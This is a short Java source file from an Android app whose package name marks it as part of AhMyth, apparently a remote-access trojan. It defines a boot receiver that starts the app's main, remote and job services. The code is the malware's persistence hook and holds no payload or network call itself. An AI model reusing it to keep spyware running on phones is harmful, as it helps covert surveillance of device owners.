package ahmyth.mine.king.ahmyth.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import ahmyth.mine.king.ahmyth.service.JobService;
import ahmyth.mine.king.ahmyth.service.MainService;
import ahmyth.mine.king.ahmyth.service.RemoteService;
import ahmyth.mine.king.ahmyth.util.LogUtils;
import ahmyth.mine.king.ahmyth.util.ToastUtils;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";
    public BootReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.
        startService(context);

    }

    public void startService(Context context) {
        context.startService(new Intent(context, MainService.class));
        context.startService(new Intent(context, RemoteService.class));
        context.startService(new Intent(context, JobService.class));
    }
}
